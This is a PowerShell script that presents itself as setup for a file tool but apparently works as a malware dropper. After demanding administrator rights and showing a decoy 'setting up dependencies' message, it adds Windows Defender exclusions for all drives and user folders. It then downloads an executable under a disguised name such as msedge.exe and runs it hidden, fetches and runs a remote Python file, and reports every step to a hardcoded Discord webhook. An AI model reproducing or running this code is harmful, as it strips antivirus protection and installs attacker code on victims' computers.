$webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'

function Send-WebhookMessage {
    param($Message)
    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Add-Type -AssemblyName PresentationFramework
        [System.Windows.MessageBox]::Show('Please run this script as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
        exit
    }

    function Show-SilentMessageBox {
        param(
            [string]$Message = "Default message",
            [string]$Title = "Info",
            [string]$Icon = "Information"
        )
        
        $arguments = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('$Message', '$Title', 'OK', '$Icon')`""
        
        Start-Process powershell -ArgumentList $arguments -WindowStyle Hidden
    }
    Show-SilentMessageBox -Message "Please give us 15-30 seconds to set up the filebase and download dependencies" -Title "Info"

    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
        }
    }

    $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    foreach ($drive in $drives) {
        Add-MpPreference -ExclusionPath $drive -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Added exclusion: $drive"
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
    }

    $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
    $selectedExe = $exeNames | Get-Random
    $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
    try {
        Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
    }

    $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Executed $selectedExe"
    } catch {
        Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
    }

    $tempFile = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".py")
    $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.py"

    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile
        Start-Process -FilePath $tempFile
    } catch {
    }

    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} catch {
    Send-WebhookMessage -Message "Unexpected error: $_"
}
